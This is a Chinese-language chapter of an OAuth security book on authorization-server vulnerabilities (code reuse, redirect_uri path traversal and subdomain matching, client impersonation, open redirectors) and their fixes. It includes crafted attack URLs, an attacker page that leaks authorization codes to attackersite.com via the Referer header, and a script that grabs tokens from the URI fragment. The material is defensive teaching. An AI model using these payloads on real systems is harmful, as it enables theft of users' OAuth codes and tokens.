# 9.常见的授权服务器漏洞

本章涵盖

- 避免在 `Authorization Server` 中常见的实现漏洞
- 防御针对 `Authorization Server` 的已知攻击

在过去几章里，我们讨论了 `OAuth Client` 和受保护资源如何可能遭受攻击者利用。本章将以同样的安全视角，把重点放在
`Authorization Server` 上。你会发现，这件事显然更难做到——这源于 `Authorization Server` 本身的特性。事实上，正如我们在第 5
章构建授权服务器时所看到的，`Authorization Server` 很可能是整个 `OAuth` 生态中最复杂的组件。我们将详细梳理在实现
`Authorization Server` 时可能遇到的诸多威胁，以及为了避免安全陷阱和常见错误，你需要采取哪些措施。

## 通用安全

由于 `Authorization Server` 同时包含面向用户的网站（用于前端通道 `front channel`）以及面向机器的 `API`（用于后端通道
`back channel`），因此所有关于安全部署 `Web Server` 的通用建议同样适用于这里。这包括：保护好服务器日志、使用具备有效证书的
`TLS`（`Transport Layer Security`，传输层安全）、提供安全的操作系统托管环境并设置恰当的账号访问控制，以及许多其他事项。这一大类话题完全可以单独写成一套书，因此我们建议你参考现有的大量资料，并提醒一句：
`Web` 是个危险的地方；务必认真采纳这些建议，并保持谨慎前行。

## 会话劫持

我们已经对 `Authorization Code` 授权流程做过大量讨论。在该流程中，为了获取 `Access Token`，客户端需要经过一个中间步骤：
`Authorization Server` 生成一个 `Authorization Code`，并通过一次 `HTTP 302` 重定向，以 `URI`
的请求参数形式传递出去。这个重定向会促使浏览器向客户端发起请求，并携带该 `Authorization Code`。

``` shell
GET /callback?code=SyWhvRM2&state=Lwt50DDQKUB8U7jtfLQCVGDL9cnmwHH1 HTTP/1.1
Host: localhost:9000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer:
http://localhost:9001/authorize?response_type=code&scope=foo&client_id=oauth-
client-1&redirect_uri=http%3A%2F%2Flocalhost%3A9000%2Fcallback&state=Lwt50DDQ
KUB8U7jtfLQCVGDL9cnmwHH1
Connection: keep-alive
```

`授权码`的值是一种`一次性`凭证，用来表示`资源所有者`的授权决策结果。我们想强调的是，对于`机密客户端`而言，`授权码`会离开服务器并经由
`用户代理`传递，因此它会保留在`浏览器`的历史记录中（图 9.1）。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105135705258.png){ loading=lazy }
  <figcaption>图 9.1：浏览器历史记录中的 `Authorization code`</figcaption>
</figure>

让我们考虑这样一个场景：设想有一台 Web 服务器，我们称之为 `Site A`，它作为 `OAuth` 客户端去调用一些 `REST API`
。资源所有者在图书馆或其他使用共享电脑的场所访问 `Site A`。`Site A` 使用 `授权码模式（authorization code grant）`（详见第 `2`
章）获取自己的 `OAuth` 令牌。这意味着必须登录到 `授权服务器（authorization server）`。由于使用了该站点，
`授权码（authorization code）` 会留在浏览器历史记录中（如图 `9.1` 所示）。资源所有者使用完毕后，几乎肯定会退出 `Site A`
，甚至可能也会退出 `授权服务器`，但他们大概率不会清理浏览器历史记录。

此时，另一个同样使用 `Site A` 的攻击者会坐到这台电脑前。攻击者会用自己的凭据登录，但会篡改重定向回 `Site A`
的过程，并注入浏览器历史记录里、来自前一位资源所有者会话的 `授权码`。结果是：尽管攻击者登录的是自己的账户，却能访问原始资源所有者的资源。结合图
`9.2`，这个场景会更容易理解。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105140600237.png){ loading=lazy }
  <figcaption>图 9.2：伪造的 `Authorization Code Grant` 授权流程</figcaption>
</figure>

原来，`OAuth` 核心规范[^1] 在 `4.1.3` 节中已经为我们提供了这个问题的解决方案：

[^1]: RFC 6749

> 客户端`绝对不得`重复使用同一个`authorization code`。如果某个`authorization code`被使用超过一次，`authorization server`
> 必须拒绝该请求，并且在可能的情况下，应撤销此前基于该`authorization code`签发的所有`token`。

实现者需要自行确保正确理解并严格按照规范来落实实现。在第 5 章中，你构建的 `authorizationServer.js` 的实现确实遵循了这一建议。

``` javascript
if (req.body.grant_type == 'authorization_code') {
  var code = codes[req.body.code];
  if (code) {
       delete codes[req.body.code];
```

这样一来，浏览器中的代码就不会被`授权服务器`重复接受，这种攻击也就不再可行了。[^2]

[^2]: [http://intothesymmetry.blogspot.ch/2014/02/oauth-2-attacks-and-bug-bounties.html](https://blog.intothesymmetry.com/2014/02/oauth-2-attacks-and-bug-bounties.html)

!!! note "重定向：`302` 还是 `307`？"

	在 `2016` 年 `1` 月，一则安全通告被发布到 `OAuth` 工作组邮件列表中，描述了一种利用浏览器在处理 `HTTP 307` 重定向时行为特性的攻击。该攻击由德国特里尔大学（`University of Trier`）的研究人员发现[^3]，其根源在于：`OAuth` 标准允许在前端通道（`front-channel`）通信中使用任意 `HTTP` 重定向状态码，并将具体采用哪一种方式的选择权交给了实现者。事实证明，浏览器对不同重定向方式的处理并不一致，而该通告展示了在 `OAuth` 中使用 `307` 重定向会带来安全隐患，并可能导致用户凭据泄露。

[^3]: [http://arxiv.org/pdf/1601.01229v2.pdf](https://arxiv.org/pdf/1601.01229v2)

对`authorization code grant type`的另一项防护措施，是将`authorization code`与`client_id`进行绑定，尤其适用于已认证的
`client`。在我们的代码库中，这一点是在下一行完成的：

``` javascript
if (code.request.client_id == clientId) {
```

这是为了涵盖 `RFC 6749` 的 `4.1.3` 节中另一条要点所必需的：

> 确保该授权码是签发给已通过认证的机密客户端的；或者如果客户端是公共客户端，则需确保该授权码是签发给请求中的 `client_id`
> 的。

如果不做这些校验，任何客户端都可能拿着为另一个客户端签发的授权码去换取访问令牌。这可能会带来严重后果。

## Redirect URI篡改

在第 `7` 章中，我们已经看到：对于一个 `OAuth` 客户端来说，必须格外重视已注册的 `redirect_uri`
——明确来说，它应该尽可能具体。前面展示的攻击对认证服务器所采用的校验算法做了一些假设。`OAuth` 规范将 `redirect_uri`
的验证方式完全交由授权服务器决定，只要求这些值必须匹配。授权服务器通常会用三种常见方式，将请求中的 `redirect_uri` 与已注册的
`redirect_uri` 进行校验：`精确匹配`、`允许子目录`、`允许子域名`。下面我们依次看看它们各自是如何工作的。

`精确匹配` 校验算法正如其名：它会拿到接收到的 `redirect_uri` 参数，用简单的字符串比较，将其与该客户端记录中保存的
`redirect_uri` 进行对比。如果不匹配，就会显示错误。在第 `5` 章中，我们在自己的授权服务器里就是这样实现这段逻辑的。

``` javascript
if (req.query.redirect_uri != client.redirect_uri) {
  console.log('Mismatched redirect URI, expected %s got %s',
  client.redirect_uri, req.query.redirect_uri);
  res.render('error', {error: 'Invalid redirect URI'});
  return;
}
```

从代码中可以看出，接收到的 `redirect_uri` 必须与已注册的那个完全一致，程序才能继续执行。

我们在第 `7` 章已经介绍过“允许子目录”的校验算法。该算法只校验 `URI` 的起始部分：只要注册的 `redirect_uri`
作为前缀匹配，后面追加的任何内容都会被视为有效请求。正如我们所见，重定向 `URL` 的 `host` 和 `port` 必须与已注册的回调 `URL`
完全一致。`redirect_uri` 的 `path` 则可以指向已注册回调 `URL` 下的某个子目录。

“允许子域名”的校验算法则在 `redirect_uri` 的 `host` 部分提供了一定灵活性：只要提供的是已注册 `redirect_uri`
的某个子域名，就会被判定为有效。

另一种做法是采用同时支持“允许子域名匹配”和“允许子目录匹配”的校验算法，从而在域名和请求路径两方面都具备灵活性。

有时，这类匹配会通过通配符或其他语法表达式语言进行约束，但效果一致：多个不同请求都可能匹配同一个已注册值。我们来总结一下不同方案：已注册的重定向
`URI` 为 `https://example.com/path`，表 `9.1` 展示了多种方案下的匹配行为。

现在必须把话说明白：对 `redirect_uri` 来说，唯一始终安全且可靠的校验方式就是“精确匹配”。尽管其他方法能为客户端开发者在应用部署管理上提供更理想的灵活性，但它们都存在可被利用的风险。

下面看看当使用不同校验算法时可能发生什么。我们已经看到过这种漏洞在真实环境中的多个利用案例 [^4]，这里将聚焦该漏洞利用的基本机制。

[^4]: [https://nealpoole.com/blog/2011/08/lessons-from-facebooks-security-bug-bounty-program/andhttp://intothesymmetry.blogspot.it/2014/04/oauth-2-how-i-have-hacked-facebook.html](https://nealpoole.com/blog/2011/08/lessons-from-facebooks-security-bug-bounty-program/andhttp://intothesymmetry.blogspot.it/2014/04/oauth-2-how-i-have-hacked-facebook.html)

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105141815863.png){ loading=lazy }
  <figcaption>表 9.1 `redirect URI` 匹配算法对比</figcaption>
</figure>

假设有一家公司 `www.thecloudcompany.biz`，提供通过自助注册来登记你自己的 `OAuth` 客户端的能力。这是一种常见的客户端管理方式。授权服务器对
`redirect_uri` 采用“允许子目录”校验算法。现在我们来看看，当某个 `OAuth` 客户端进行注册时会发生什么。

``` shell
https://theoauthclient.com/oauth/oauthprovider/callback
```

作为它的 `redirect_uri`。

由 `OAuth` 客户端发起的请求大致如下：

``` shell
https://www.thecloudcompany.biz/authorize?response_type=code&client_id=CLIENT_
ID&scope=SCOPES&state=STATE&redirect_uri=https://theoauthclient.com/oauth/oauth
provider/callback
```

该攻击成功的前提是，攻击者必须能够在目标 `OAuth` 客户端站点上创建一个页面，例如：

``` shell
https://theoauthclient.com/usergeneratedcontent/attackerpage.html
```

这个 `URI` 并不在已注册的 `URI` 之下，所以就没问题了，对吧？攻击者只需要构造一个类似下面这样的 `URI`：

``` shell
https://www.thecloudcompany.biz/authorize?response_type=code&client_id=CLIENT_
ID&scope=SCOPES&state=STATE&redirect_uri=https://theoauthclient.com/oauth/oauth
provider/callback/../../usergeneratedcontent/attackerpage.html
```

并诱使受害者点击它。需要重点仔细查看的是：`redirect_uri` 值中隐藏的相对目录跳转（导航）部分。

``` shell
redirect_uri=https://theoauthclient.com/oauth/oauthprovider/callback/../../usergeneratedcontent/attackerpage.html
```

根据我们之前的讨论，如果使用 `允许子目录` 的校验算法进行匹配，这个提供的 `redirect_uri` 完全是合法的。这个精心构造的
`redirect_uri` 利用 `路径穿越`[^5] 一路回退到站点根目录，再进入攻击者的 `用户生成页面`。如果授权服务器采用 `首次使用即信任（TOFU）`
（如第 `1` 章所述），并因此阻止向受害者展示授权页面（见图 `9.3`），这种情况就非常危险。

[^5]: [https://www.owasp.org/index.php/Path_Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105142936156.png){ loading=lazy }
  <figcaption>图 9.3：攻击者窃取`授权码`。</figcaption>
</figure>

为完成这次攻击，我们来看看攻击者页面会是什么样子。在这个场景下，我们可以同时使用第 `7` 章介绍的两类攻击：根据目标是
`authorization code` 还是 `implicit grant`，选择利用 `referrer` 或 `URI fragment`。

先看利用 `HTTP referrer` 对 `authorization code grant` 发起的攻击。攻击者页面会通过一次 `HTTP 302`
重定向返回，这会促使浏览器向客户端站点发起如下请求：

``` shell
GET
/oauth/oauthprovider/callback/../../usergeneratedcontent/attackerpage.html?
code=SyWhvRM2&state=Lwt50DDQKUB8U7jtfLQCVGDL9cnmwHH1 HTTP/1.1
Host: theoauthclient.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
```

攻击者页面 `attackerpage.html` 的内容如下：

``` html
<html>
  <h1>Authorization in progress </h1>
  <img src="https://attackersite.com/">
</html>
```

授权码随后会在浏览器抓取攻击者页面中嵌入的 `img` 标签时，通过 `Referer` 头被窃取。有关该攻击的更多细节，请参见第 `7` 章。

对于基于哈希的隐式授权（`implicit grant`）攻击，`attackerpage.html` 会直接收到下发的访问令牌（`access token`）。当授权服务器发送
`HTTP 302` 重定向时，资源所有者的浏览器会向客户端发起如下请求：

``` shell
GET
/oauth/oauthprovider/callback/../../usergeneratedcontent/attackerpage.html#
access_token=2YotnFZFEjr1zCsicMWpAA&state=Lwt50DDQKUB8U7jtfLQCVGDL9cnmwHH1
HTTP/1.1
Host: theoauthclient.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
```

并且它还可能通过 `URI` 片段被劫持。比如，这段简单的 `JavaScript` 代码会从 `hash` 中取出 `token`
，之后就可以直接使用它，或将其转发/传输到其他地方。（其他方法请参见第 `7` 章。）

``` html
<html>
  <script>
      var access_token = location.hash;
  </script>
</html>
```

同样的攻击也适用于那些在校验 `redirect_uri` 时采用“允许子域名”的验证算法的授权服务器，以及允许在 `redirect_uri`
域名下创建由攻击者控制页面的 `OAuth` 客户端。在这种情况下，已注册的 `redirect_uri` 可能类似于
`https://theoauthclient.com/`，而攻击者控制的页面则运行在 `https://attacker.theoauthclient.com`。随后，攻击者精心构造的 `
URI` 将会是

``` shell
https://www.thecloudcompany.biz/authorize?response_type=code&client_id=CLIENT_ID&
scope=SCOPES&state=STATE&redirect_uri=https://attacker.theoauthclient.com
```

`https://attacker.theoauthclient.com` 这个页面与 `attackerpage.html` 类似。

需要特别强调的一点是：在这个案例中，`OAuth client` 本身并没有过错。我们看到的这些 `OAuth client` 都遵循了规则，把
`redirect_uri` 注册得尽可能具体；然而，由于 `authorization server` 的弱点，攻击者仍然能够劫持 `authorization code`
——甚至更糟，直接劫持 `access token`。

!!! note "Covert Redirect"

	`Covert Redirect` 是安全研究员 `Wang Jing` 于 2014 年提出的、对开放重定向器攻击的一种命名。[^6] 它描述了一种流程：恶意攻击者拦截从 `OAuth client` 发往 `OAuth 2.0 authorization server` 的请求，并篡改请求中的一个名为 `redirect_uri` 的查询参数，意图让 `OAuth authorization server` 将最终生成的 `OAuth` 响应重定向到攻击者控制的恶意地址，而不是返回到最初发起请求的客户端，从而使任何返回的敏感信息暴露给攻击者。官方的 `OAuth 2.0 Threat Model`（`RFC 6819`）对这一威胁有详细说明，并且该 `RFC` 的 `5.2.3.5` 节记录了推荐的缓解措施：

	授权服务器应当要求所有客户端注册其 `redirect_uri`，并且该 `redirect_uri` 应当是 `RFC6749` 中定义的完整 `URI`。

[^6]: [http://oauth.net/advisories/2014-1-covert-redirect/](https://oauth.net/advisories/2014-1-covert-redirect/)

## 客户端冒充

在第 `7` 章以及本章上一节中，我们已经看到多种劫持授权码的技术。我们也看到，在不知道 `client_secret` 的情况下，攻击者做不了太多事，因为要用授权码换取访问令牌，必须用到这个密钥。只有当授权服务器遵循 `OAuth` 核心规范第 `4.1.3` 节时，这一点才成立，尤其是：

确保在初始授权请求中按 `4.1.1` 节所述包含了 `redirect_uri` 参数的情况下，此时的 `redirect_uri` 参数也必须存在；并且如果包含，则必须确保两者的值完全一致。

我们假设某个授权服务器没有实现规范的这一部分，看看会发生什么。如果你一直跟着第 `5` 章构建授权服务器，可能会注意到：我们在基础实现里故意把这一点省略了，就是为了在这里讲。

如前所述，攻击者手里只有一个授权码。他们并不知道该授权码所绑定客户端的 `client_secret`，所以按理说什么也做不了。但如果授权服务器没有实现这个校验，问题依然会出现。在深入之前，我们先回顾一下攻击者最初是如何偷到授权码的。我们见过的所有授权码窃取手法（无论是本章还是第 `7` 章）都与某种形式的 `redirect_uri` 篡改有关。这之所以能得逞，要么是 `OAuth` 客户端注册的 `redirect_uri` 选得不当，要么是授权服务器对 `redirect_uri` 的校验算法过于宽松。两种情况下，注册的 `redirect_uri` 都与 `OAuth` 请求中提供的并不完全一致。尽管如此，攻击者仍然通过精心构造的恶意 `URI` 劫持到了授权码。

接下来，攻击者可以把这个被劫持的授权码提交给受害者 `OAuth` 客户端的 `OAuth` 回调地址。此时，客户端会继续执行，用有效的客户端凭据向授权服务器发起请求，尝试用该授权码换取访问令牌。该授权码绑定的仍然是正确的 `OAuth` 客户端（见图 `9.4`）。

<figure markdown="span">
  ![](https://cdn.jsdelivr.net/gh/luguosong/images@master/blog-img/20260105143850372.png){ loading=lazy }
  <figcaption>图 9.4：被劫持的`授权码`（存在漏洞的`授权服务器`）</figcaption>
</figure>

攻击者最终能够成功使用被劫持的授权码，并窃取目标受害者的受保护资源。

接下来看看如何在我们的代码库中修复这个问题。打开 `ch-9-ex-1`，编辑 `authorizationServer.js` 文件。本练习中我们不会修改其他文件。在该文件中，找到授权服务器的 `token endpoint`，尤其是处理 `authorization grant request` 的那段逻辑，然后添加以下代码片段：

``` javascript
if (code.request.redirect_uri) {
  if (code.request.redirect_uri != req.body.redirect_uri) {
       res.status(400).json({error: 'invalid_grant'});
       return;
  }
}
```

当 `OAuth` 客户端把被劫持的授权码提交给 `Authorization Server` 时，`Authorization Server` 会确保：在最初的授权请求中提供的 `redirect_uri`，必须与在令牌请求（`Token Request`）中提供的 `redirect_uri` 完全一致。由于客户端并不打算把任何人重定向到攻击者的网站，这两个值就不会匹配，攻击因此失败。加入这一简单校验至关重要，它能够抵消授权码模式（`Authorization Code Grant`）中许多常见攻击。若缺少这项额外校验，存在多种已知风险，并且已被攻击者在真实环境中加以利用。[^7]

[^7]: [http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html](https://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html)

## 开放重定向器

我们在第 `7` 章已经接触过 `开放重定向器` 漏洞，也看过它如何被用来从 `OAuth` 客户端窃取 `访问令牌`。在本节中，我们将看到：如果逐字照搬 `OAuth` 核心规范来实现，可能会导致 `授权服务器` 充当一个 `开放重定向器`。[^8] 需要强调的是，如果这是有意为之，那未必就是坏事；`开放重定向器` 本身并不一定会引发问题，尽管它通常被认为是一种不良设计。另一方面，如果在设计 `授权服务器` 架构时没有把这一点考虑进去，那么在本节将要介绍的某些特定条件下，一个可被任意使用的 `开放重定向器` 会给攻击者留下可乘之机。

[^8]: [http://intothesymmetry.blogspot.it/2015/04/open-redirect-in-rfc6749-aka-oauth-20.html](https://blog.intothesymmetry.com/2015/04/open-redirect-in-rfc6749-aka-oauth-20.html)

为了理解这个问题，我们需要更深入地查看 `OAuth` 规范的 `4.1.2.1` 节：[^9]

[^9]: [https://tools.ietf.org/html/rfc6749#section-4.1.2.1](https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.2.1)

> 如果请求因缺失、无效或不匹配的重定向 `URI` 而失败，或者客户端标识符缺失或无效，授权服务器 `SHOULD` 将错误告知资源所有者，并且 `MUST NOT` 自动将用户代理重定向到无效的重定向 `URI`。
>
> 如果资源所有者拒绝访问请求，或者请求失败的原因并非缺失或无效的重定向 `URI`，授权服务器会通过在重定向 `URI` 的查询部分添加以下参数来通知客户端……

在这段讨论中，我们特别关注的是斜体部分。它说明：如果授权服务器收到无效的请求参数，例如无效的 `scope`，资源所有者会被重定向到客户端已注册的 `redirect_uri`。

我们可以在第 `5` 章看到这一行为的实现：

``` javascript
if (__.difference(rscope, cscope).length > 0) {
  var urlParsed = buildUrl(query.redirect_uri, {
      error: 'invalid_scope'
  });
  res.redirect(urlParsed);
  return;
}
```

如果你想试一试，打开 `ch-9-ex-2` 并运行 `authorization server`。然后打开你常用的浏览器，访问

``` shell
http://localhost:9001/authorize?client_id=oauth-client-1&redirect_uri=http://localhost:9000/callback&scope=WRONG_SCOPE
```

你看到的是你的浏览器正在被重定向到 

``` shell
http://localhost:9000/callback?error=invalid_scope
```

问题还在于，授权服务器可能允许客户端注册时随意填写 `redirect_uri`。你也许会说，这不就是个开放重定向吗，能做的事不多，对吧？并非如此。假设攻击者这样做：

- 在 `https://victim.com` 的授权服务器上注册一个新客户端。
- 注册一个 `redirect_uri`，比如 `https://attacker.com`。

然后攻击者就可以构造一个如下形式的特殊 `URI`：

``` shell
https://victim.com/authorize?response_type=code&client_id=bc88FitX1298KPj2WS259
BBMa9_KCfL3&scope=WRONG_SCOPE&redirect_uri=https://attacker.com
```

这应该会在**无需任何用户交互**的情况下，直接重定向回 `https://attacker.com`，并符合开放重定向器（open redirector）的定义。[^10] 那接下来呢？对许多攻击而言，拿到一个开放重定向器通常只是攻击链中的一小环，但却是至关重要的一环。从攻击者的角度看，还有什么比“开箱即用”地从一个受信任的 `OAuth` 提供商那里拿到这个能力更妙的呢？

[^10]: [https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards](https://owasp.org/www-project-top-ten/)

如果这还不足以让你相信 `Open Redirector` 的危害有多大，那么请注意：这一漏洞曾在真实环境中被用于攻击，以窃取 `Access Token`。[^11] 有意思的是，把本节介绍的 `Open Redirector` 与前文讲到的 `URI` 篡改结合起来，竟然能做到很多事。若 `Authorization Server` 对 `redirect_uri` 采用模式匹配（如前面提到的允许子目录），并且存在一个未被攻破的 `Public Client`，且它与 `Authorization Server` 共享同一域名，那么攻击者就可以利用重定向错误的跳转，通过 `Referer` 头和 `URI Fragment` 来拦截基于重定向的协议消息。在这种情况下，攻击者会执行以下操作：

[^11]: [http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html](https://andrisatteka.blogspot.com/2014/09/how-microsoft-is-giving-your-data-to.html)

- 向 `https://victim.com` 授权服务器为一个新的客户端完成注册。
- 注册一个 `redirect_uri`，例如 `https://attacker.com`。
- 为该恶意客户端构造一个无效的认证请求 `URI`。例如可以使用错误或不存在的 `scope`（如前所述）：  
  `https://victim.com/authorize?response_type=code&client_id=bc88FitX1298KPj2WS259BBMa9_KCfL3&scope=WRONG_SCOPE&redirect_uri=https://attacker.com`
- 构造一个针对正常客户端（`good-client`）的恶意 `URI`：利用 `redirect_uri` 把请求转发到恶意客户端，使用上一步中的 `URI`：  
  `https://victim.com/authorize?response_type=token&client_id=good-client&scope=VALID_SCOPE&redirect_uri=https%3A%2F%2Fvictim.com%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3Dattacker-client-id%26scope%3DWRONG_SCOPE%26redirect_uri%3Dhttps%3A%2F%2Fattacker.com`
- 如果受害者此前已经使用过 `OAuth` 客户端（`good-client`），并且授权服务器支持 `TOFU`（不会再次提示用户），攻击者就会收到重定向到 `https://attacker.com` 的响应：合法的 `OAuth` 授权响应会在 `URI` 片段（fragment）中包含一个访问令牌（`access token`）。如果 `Location` 的重定向 `URI` 中不包含片段，大多数 Web 浏览器会把片段附加到 `30x` 响应的 `Location` 头所发送的 `URI` 后面。

如果授权请求返回的是 `code` 而不是 `token`，同样可以使用该技巧，但泄露的是 `code`：浏览器会通过 `Referer` 头泄露，而不是通过片段（fragment）。最近有人提出了一份 `OAuth` 安全补充草案，旨在为实现者提供更好的建议。[^12] 草案中包含的一项缓解措施是：返回 `HTTP 400 (Bad Request)` 状态码，而不是重定向回已注册的 `redirect_uri`。作为练习，我们可以尝试实现这一点。打开 `ch-9-ex-2` 并编辑 `authorizationServer.js`。我们要做的只是把之前代码中高亮的那一段替换为：

[^12]: [https://tools.ietf.org/html/draft-ietf-oauth-closing-redirectors](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-closing-redirectors)

``` javascript
if (__.difference(rscope, client.scope).length > 0) {
  res.status(400).render('error', {error: 'invalid_scope'});
  return;
}
```

现在我们再重复本节开头的练习：启动 `Authorization Server`，打开你常用的浏览器，然后访问 

```shell
http://localhost:9001/authorize?client_id=oauth-client-1&redirect_uri=http://localhost:9000/callback&scope=WRONG_SCOPE
```

`HTTP 400`（`Bad Request`）状态码会被返回，而不是进行 `30x` 重定向。其他建议的缓解措施还包括：

- 重定向到一个由 `Authorization Server` 控制的中间 `URI`，以清除浏览器中的 `Referer` 信息（其中可能包含安全令牌信息）。
- 在错误重定向 `URI` 后追加 `#`（这可以防止浏览器把前一个 `URI` 的片段 `fragment` 重新附加到新的 `location URI` 上）。

关于这些额外缓解措施的编码实现部分，我们就留给读者作为练习。

## 总结

在保护 `Authorization Server` 时需要承担许多职责，因为它是 `OAuth` 安全生态系统的中枢。

- 授权码一旦被使用，就应立即作废（`burn`）。
- 对于 `redirect_uri`，`Authorization Server` 应采用的**唯一**安全校验方式是**精确匹配**（`exact matching`）。
- 若完全照搬 `OAuth` 核心规范实现，可能会让 `Authorization Server` 变成一个开放重定向器（`open redirector`）。如果这是一个被妥善监控的重定向器，那问题不大；但若实现不当，则可能带来风险。
- 在错误报告过程中，要警惕通过 `fragment` 或 `Referer` 头泄露信息的可能。

既然我们已经看过如何保护 `OAuth` 生态系统的三大主要组成部分，接下来就来看看如何保护任何 `OAuth` 交易中最关键的要素：`OAuth token`。
